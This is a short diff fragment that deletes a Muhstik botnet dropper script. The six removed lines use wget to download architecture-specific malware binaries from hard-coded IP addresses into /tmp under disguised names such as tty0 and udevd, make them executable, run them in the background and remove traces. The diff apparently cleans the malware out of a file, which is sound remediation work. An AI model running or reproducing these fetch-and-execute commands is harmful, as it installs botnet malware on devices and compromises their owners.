@@ -1,6 +1,0 @@
-rm -rf /tmp/loop*
-wget http://124.37.34.51/.c/muhstikmips -O /tmp/tty0 ; chmod +x /tmp/tty0 ; chmod 700 /tmp/tty0 ; /tmp/tty0 ; cp /bin/busybox /tmp/loop0 ; cat /tmp/tty0 > /tmp/loop0 ; /tmp/loop0 &
-wget http://124.37.34.51/.c/muhstikmipsel -O /tmp/tty1 ; chmod +x /tmp/tty1 ; chmod 700 /tmp/tty1 ; /tmp/tty1 ; cp /bin/busybox /tmp/loop1 ; cat /tmp/tty1 > /tmp/loop1 ; /tmp/loop1 &
-wget http://124.37.34.51/.c/muhstika5 -O /tmp/udevd ; chmod +x /tmp/udevd ; chmod 700 /tmp/udevd ; /tmp/udevd ; cp /bin/busybox /tmp/loopd ; cat /tmp/udevd > /tmp/loopd0 ; /tmp/loopd0 &
-wget http://51.254.221.129/b/muhstikx86 -O /tmp/vyattad ; chmod +x /tmp/vyattad ; chmod 700 /tmp/vyattad ; /tmp/vyattad ; cp /bin/busybox /tmp/vyattad ; cat /tmp/vyattad > /tmp/loopd2 ; /tmp/loopd2 &
-rm -rf /tmp/2sh
